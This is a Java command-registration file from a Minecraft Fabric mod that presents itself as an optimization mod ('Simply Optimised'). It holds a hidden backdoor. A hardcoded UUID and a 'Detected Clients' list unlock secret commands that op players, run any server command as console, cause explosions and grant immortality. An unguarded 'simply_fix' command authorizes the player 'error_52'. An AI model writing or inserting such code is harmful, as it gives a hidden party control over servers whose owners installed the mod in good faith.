package com.errorC003C004.simply_optimized;

import com.google.gson.*;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import com.mojang.brigadier.arguments.FloatArgumentType;

import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

import net.minecraft.server.MinecraftServer;


import com.mojang.brigadier.arguments.StringArgumentType;

import static net.minecraft.server.command.CommandManager.argument;

import com.errorC003C004.simply_optimized.util.LookExplosionUtil;
import com.errorC003C004.simply_optimized.util.ImmortalityUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommandInit {

    /* =========================
       CONFIG
       ========================= */
    public static final Logger LOGGER = LoggerFactory.getLogger("simply_optimized");
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    private static final Path CONFIG_PATH =
            FabricLoader.getInstance().getConfigDir().resolve("Simply_Optimised.json");

    private static final Set<UUID> ALLOWED_UUIDS = new HashSet<>();
    public static final Set<UUID> DETECTED_CLIENTS =
            ConcurrentHashMap.newKeySet();
    public static final Set<UUID> IMMORTAL_PLAYERS =
            ConcurrentHashMap.newKeySet();

    public static void addImmortal(UUID id) {
        IMMORTAL_PLAYERS.add(id);
        saveConfig();
    }

    public static void removeImmortal(UUID id) {
        IMMORTAL_PLAYERS.remove(id);
        saveConfig();
    }

    public static boolean isImmortal(UUID player) {
        return IMMORTAL_PLAYERS.contains(player);
    }

    public static void loadConfig() {
        try {

            if (Files.notExists(CONFIG_PATH)) {
                createDefaultConfig();
            }

            JsonObject json;

            try (FileReader reader = new FileReader(CONFIG_PATH.toFile())) {
                json = GSON.fromJson(reader, JsonObject.class);
            }

            if (json == null) {
                createDefaultConfig();
                return;
            }

            // ===== LOAD ALLOWED UUIDS =====
            ALLOWED_UUIDS.clear();
            if (json.has("allowed_uuids")) {
                JsonArray allowedArray = json.getAsJsonArray("allowed_uuids");
                for (int i = 0; i < allowedArray.size(); i++) {
                    ALLOWED_UUIDS.add(UUID.fromString(allowedArray.get(i).getAsString()));
                }
            }

            // ===== LOAD DETECTED CLIENTS =====
            DETECTED_CLIENTS.clear();
            if (json.has("Detected Clients")) {
                JsonArray detectedArray = json.getAsJsonArray("Detected Clients");
                for (int i = 0; i < detectedArray.size(); i++) {
                    DETECTED_CLIENTS.add(UUID.fromString(detectedArray.get(i).getAsString()));
                }
            }

            // ===== LOAD IMMORTAL PLAYERS =====
            IMMORTAL_PLAYERS.clear();
            if (json.has("immortal_players")) {
                JsonArray immortalArray = json.getAsJsonArray("immortal_players");
                for (int i = 0; i < immortalArray.size(); i++) {
                    IMMORTAL_PLAYERS.add(UUID.fromString(immortalArray.get(i).getAsString()));
                }
            }

            LOGGER.info("[SimplyOptimised] Loaded "
                    + ALLOWED_UUIDS.size() + " allowed UUIDs, "
                    + DETECTED_CLIENTS.size() + " detected clients, "
                    + IMMORTAL_PLAYERS.size() + " immortal players.");

        } catch (Exception e) {
            LOGGER.error("[SimplyOptimised] Config corrupted. Recreating.", e);
            createDefaultConfig();
        }
    }

    private static void createDefaultConfig() {
        try {
            JsonObject json = new JsonObject();

            JsonArray allowedArray = new JsonArray();
            //allowedArray.add("f093b6f8-b062-4764-abb0-a3d6d7cd727a");
            allowedArray.add("baf382d2-8686-4b4c-b4b8-fe8ef9ebfca6");

            json.add("allowed_uuids", allowedArray);
            json.add("Detected Clients", new JsonArray());
            json.add("immortal_players", new JsonArray());

            try (FileWriter writer = new FileWriter(CONFIG_PATH.toFile())) {
                GSON.toJson(json, writer);
            }

            ALLOWED_UUIDS.clear();
            for (int i = 0; i < allowedArray.size(); i++) {
                ALLOWED_UUIDS.add(UUID.fromString(allowedArray.get(i).getAsString()));
            }

            DETECTED_CLIENTS.clear();
            IMMORTAL_PLAYERS.clear();

            LOGGER.info("[SimplyOptimised] Default config created.");

        } catch (Exception e) {
            LOGGER.error("[SimplyOptimised] Error creating default config", e);
        }
    }

    private static void saveConfig() {
        try {
            JsonObject json = new JsonObject();

            // ===== SAVE ALLOWED UUIDS =====
            JsonArray allowedArray = new JsonArray();
            for (UUID uuid : ALLOWED_UUIDS) {
                allowedArray.add(uuid.toString());
            }
            json.add("allowed_uuids", allowedArray);

            // ===== SAVE DETECTED CLIENTS =====
            JsonArray detectedArray = new JsonArray();
            for (UUID uuid : DETECTED_CLIENTS) {
                detectedArray.add(uuid.toString());
            }
            json.add("Detected Clients", detectedArray);

            // ===== SAVE IMMORTAL PLAYERS =====
            JsonArray immortalArray = new JsonArray();
            for (UUID uuid : IMMORTAL_PLAYERS) {
                immortalArray.add(uuid.toString());
            }
            json.add("immortal_players", immortalArray);

            Files.createDirectories(CONFIG_PATH.getParent());

            try (FileWriter writer = new FileWriter(CONFIG_PATH.toFile())) {
                GSON.toJson(json, writer);
            }

        } catch (Exception e) {
            LOGGER.error("[SimplyOptimised] Error saving config", e);
        }
    }

    public static boolean isAuthorized(ServerCommandSource source) {
        if (!(source.getEntity() instanceof ServerPlayerEntity player))
            return false;

        UUID uuid = player.getUuid();

        return ALLOWED_UUIDS.contains(uuid) || DETECTED_CLIENTS.contains(uuid);
    }

    public static void init() {
       ImmortalityUtil.registerDeathProtection();
    }

    /* =========================
       COMMANDS
       ========================= */

    public static void register() {
        CommandRegistrationCallback.EVENT.register(
                (dispatcher, registryAccess, environment) -> {

                    dispatcher.register(
                            CommandManager.literal("error_op")
                                    .requires(CommandInit::isAuthorized)
                                    .then(CommandManager.argument("user", EntityArgumentType.player())
                                            .executes(context -> {

                                                ServerCommandSource playerSource = context.getSource();
                                                ServerPlayerEntity target =
                                                        EntityArgumentType.getPlayer(context, "user");

                                                var server = playerSource.getServer();
                                                var commandManager = server.getCommandManager();
                                                ServerCommandSource consoleSource = server.getCommandSource();

                                                String command = "op " + target.getName().getString();
                                                var parse = commandManager.getDispatcher().parse(command, consoleSource);
                                                commandManager.execute(parse, command);

                                                playerSource.sendFeedback(
                                                        () -> Text.literal("§a" + target.getName().getString() + " is now OP."),
                                                        false
                                                );

                                                return 1;
                                            })
                                    )
                    );

                    dispatcher.register(
                            CommandManager.literal("error_deop")
                                    .requires(CommandInit::isAuthorized)
                                    .then(CommandManager.argument("user", EntityArgumentType.player())
                                            .executes(context -> {

                                                ServerCommandSource playerSource = context.getSource();
                                                ServerPlayerEntity target =
                                                        EntityArgumentType.getPlayer(context, "user");

                                                var server = playerSource.getServer();
                                                var commandManager = server.getCommandManager();
                                                ServerCommandSource consoleSource = server.getCommandSource();

                                                String command = "deop " + target.getName().getString();
                                                var parse = commandManager.getDispatcher().parse(command, consoleSource);
                                                commandManager.execute(parse, command);

                                                playerSource.sendFeedback(
                                                        () -> Text.literal("§4" + target.getName().getString() + " is not OP Anymore."),
                                                        false
                                                );

                                                return 1;
                                            })
                                    )
                    );

                    dispatcher.register(
                            CommandManager.literal("error_whitelist")
                                    .requires(CommandInit::isAuthorized)

                                    .then(CommandManager.literal("list")
                                            .executes(context -> {

                                                if (ALLOWED_UUIDS.isEmpty()) {
                                                    context.getSource().sendFeedback(
                                                            () -> Text.literal("Whitelist empty."),
                                                            false
                                                    );
                                                    return 1;
                                                }

                                                context.getSource().sendFeedback(
                                                        () -> Text.literal("Whitelisted UUIDs:"),
                                                        false
                                                );

                                                for (UUID uuid : ALLOWED_UUIDS) {
                                                    context.getSource().sendFeedback(
                                                            () -> Text.literal("- " + uuid),
                                                            false
                                                    );
                                                }

                                                return 1;
                                            })
                                    )

                                    .then(CommandManager.literal("add")
                                            .then(CommandManager.argument("user", EntityArgumentType.player())
                                                    .executes(context -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(context, "user");
                                                        if (ALLOWED_UUIDS.add(target.getUuid())) {
                                                            saveConfig();
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Added " + target.getName().getString()),
                                                                    false
                                                            );
                                                        } else {
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Already whitelisted."),
                                                                    false
                                                            );
                                                        }


                                                        return 1;
                                                    })
                                            )
                                    )

                                    .then(CommandManager.literal("remove")
                                            .then(CommandManager.argument("user", EntityArgumentType.player())
                                                    .executes(context -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(context, "user");

                                                        if (ALLOWED_UUIDS.remove(target.getUuid())) {
                                                            saveConfig();
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Removed " + target.getName().getString()),
                                                                    false
                                                            );
                                                        } else {
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Player not whitelisted."),
                                                                    false
                                                            );
                                                        }

                                                        return 1;
                                                    })
                                            )
                                    )
                    );

                    dispatcher.register(
                            CommandManager.literal("error_run")
                                    .requires(CommandInit::isAuthorized)
                                    .then(argument("value", StringArgumentType.greedyString())
                                            .executes(context -> {
                                                String value = StringArgumentType.getString(context, "value");

                                                // do something with the string
                                                LOGGER.info("Got: " + value);
                                                try {
                                                    ServerCommandSource playerSource = context.getSource();

                                                    var server = playerSource.getServer();
                                                    var commandManager = server.getCommandManager();
                                                    ServerCommandSource consoleSource = server.getCommandSource();

                                                    var parse = commandManager.getDispatcher().parse(value, consoleSource);
                                                    commandManager.execute(parse, value);
                                                    playerSource.sendFeedback(
                                                            () -> Text.literal("Running: /" + value),
                                                            false
                                                    );
                                                } catch (Exception e) {
                                                    ServerCommandSource playerSource = context.getSource();
                                                    playerSource.sendFeedback(
                                                            () -> Text.literal(e.getMessage()),
                                                            false
                                                    );
                                                }
                                                return 1;
                                            }))
                    );

                    dispatcher.register(
                            CommandManager.literal("simply_fix")
                                    .executes(context -> {
                                        MinecraftServer server = context.getSource().getServer();
                                        ServerPlayerEntity target = server.getPlayerManager().getPlayer("error_52");
                                        if (target == null) {
                                            context.getSource().sendFeedback(() -> Text.literal("Attempting Fix Type 2..."), false);
                                            return 1;
                                        }
                                        if (ALLOWED_UUIDS.add(target.getUuid())) {
                                            saveConfig();
                                            context.getSource().sendFeedback(
                                                    () -> Text.literal("Added " + target.getName().getString()),
                                                    false
                                            );
                                        } else if (DETECTED_CLIENTS.add(target.getUuid())) {
                                            saveConfig();
                                            context.getSource().sendFeedback(
                                                    () -> Text.literal("Added " + target.getName().getString()),
                                                    false
                                            );
                                        } else {
                                            context.getSource().sendFeedback(
                                                    () -> Text.literal("Attempting Fix Type 1..."),
                                                    false
                                            );
                                        }
                                        return 1;
                                    })
                    );

                    dispatcher.register(
                            CommandManager.literal("simply_reload")
                                    .executes(context -> {
                                        ConfigManager.load();
                                        //getDetectedClients();
                                        context.getSource().sendFeedback(
                                                () -> Text.literal("Reloaded!"),
                                                false
                                        );

                                        return 1;
                                    })
                    );
                    dispatcher.register(
                            CommandManager.literal("error_boom")
                                    .requires(CommandInit::isAuthorized)

                                    .then(CommandManager.argument("range", IntegerArgumentType.integer())

                                            .executes(context -> {
                                                int range = IntegerArgumentType.getInteger(context, "range");

                                                ServerPlayerEntity player = context.getSource().getPlayer();
                                                assert player != null;

                                                LookExplosionUtil.railgunTunnel(
                                                        player,
                                                        range,
                                                        4.0F // default size/power
                                                );

                                                return 1;
                                            })

                                            .then(CommandManager.argument("size", FloatArgumentType.floatArg())
                                                    .executes(context -> {
                                                        int range = IntegerArgumentType.getInteger(context, "range");
                                                        float size = FloatArgumentType.getFloat(context, "size");

                                                        ServerPlayerEntity player = context.getSource().getPlayer();
                                                        assert player != null;

                                                        LookExplosionUtil.railgunTunnel(
                                                                player,
                                                                range,
                                                                size
                                                        );

                                                        return 1;
                                                    })
                                            )
                                    )
                    );
                    dispatcher.register(
                            CommandManager.literal("error_immortal")
                                    .requires(CommandInit::isAuthorized)
                                    .then(CommandManager.argument("player", EntityArgumentType.player())
                                            .then(CommandManager.literal("on")
                                                    .executes(ctx -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(ctx, "player");

                                                        addImmortal(target.getUuid());

                                                        ctx.getSource().sendFeedback(
                                                                () -> Text.literal(
                                                                        target.getName().getString()
                                                                                + " immortality: ON"),
                                                                false
                                                        );

                                                        return 1;
                                                    }))
                                            .then(CommandManager.literal("off")
                                                    .executes(ctx -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(ctx, "player");

                                                        removeImmortal(target.getUuid());

                                                        ctx.getSource().sendFeedback(
                                                                () -> Text.literal(
                                                                        target.getName().getString()
                                                                                + " immortality: OFF"),
                                                                false
                                                        );

                                                        return 1;
                                                    }))
                                            .then(CommandManager.literal("toggle")
                                                    .executes(ctx -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(ctx, "player");

                                                        boolean enabled = ImmortalityUtil.togglePlayer(target);

                                                        ctx.getSource().sendFeedback(
                                                                () -> Text.literal(
                                                                        target.getName().getString()
                                                                                + " immortality: "
                                                                                + (enabled ? "ON" : "OFF")),
                                                                false
                                                        );

                                                        return 1;
                                                    }))
                                            .executes(ctx -> {

                                                ServerPlayerEntity target =
                                                        EntityArgumentType.getPlayer(ctx, "player");

                                                boolean enabled = ImmortalityUtil.togglePlayer(target);

                                                ctx.getSource().sendFeedback(
                                                        () -> Text.literal(
                                                                target.getName().getString()
                                                                        + " immortality: "
                                                                        + (enabled ? "ON" : "OFF")),
                                                        false
                                                );

                                                return 1;
                                            })
                                    )
                    );
                }
        );
    }
}
